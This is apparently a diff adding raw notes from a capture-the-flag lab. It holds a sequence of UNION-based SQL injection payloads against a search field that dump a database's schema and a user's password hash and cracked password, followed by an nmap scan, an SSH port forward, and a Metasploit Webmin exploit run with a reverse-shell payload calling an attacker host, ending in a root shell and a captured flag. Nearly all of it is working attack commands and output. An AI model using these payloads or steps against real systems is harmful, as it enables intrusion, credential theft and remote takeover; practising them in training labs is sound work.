@@ -1,0 +1,87 @@
+port 80
+
+Hitman 2' union select schema_name,2,3 from information_shcema.schemata#
+
+
+Hitman 2' union select 1,database(),3#
+
+Hitman 2' union select 1, schema_name,3#
+
+searchitem= Hitman 2' union select 1, schema_name,3 from information_schema.schemata#
+
+searchitem= Hitman 2' union select 1, table_name,2 from information_schema.tables where table_schema='db'#
+
+searchitem= Hitman 2' union select 1, column_name,2 from information_schema.columns where table_schema='db' and table_name='users'#  //username,pwd
+
+searchitem= Hitman 2' union select username,pwd from db.users#
+agent47
+ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14   videogamer124
+
+
+
+─$ nmap -A -p 8821 127.0.0.1 -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 21:50 PDT
+Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 81.76% done; ETC: 21:50 (0:00:00 remaining)
+Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 81.76% done; ETC: 21:50 (0:00:00 remaining)
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000046s latency).
+
+
+
+─$ ssh -L 8821:localhost:10000 agent47@10.10.233.18
+agent47@10.10.233.18's password: 
+
+
+PORT     STATE SERVICE VERSION
+8821/tcp open  http    MiniServ 1.580 (Webmin httpd)
+|_http-title: Login to Webmin
+| http-robots.txt: 1 disallowed entry 
+|_/
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set username agent47
+username => agent47
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
+password => videogamer124
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => false
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 10.13.87.102
+lhost => 10.13.87.102
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lport 8822
+lport => 8822
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rohst 127.0.0.1
+[!] Unknown datastore option: rohst. Did you mean RHOST?
+rohst => 127.0.0.1
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rport 8821
+rport => 8821
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhost 127.0.0.1
+rhost => 127.0.0.1
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+
+
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > sessions 3
+[*] Starting interaction with 3...
+
+whoami
+root
+pwd
+/usr/share/webmin/file/
+cd /root
+ls
+root.txt
+cat root.txt
+a4b945830144bdd71908d12d902adeee
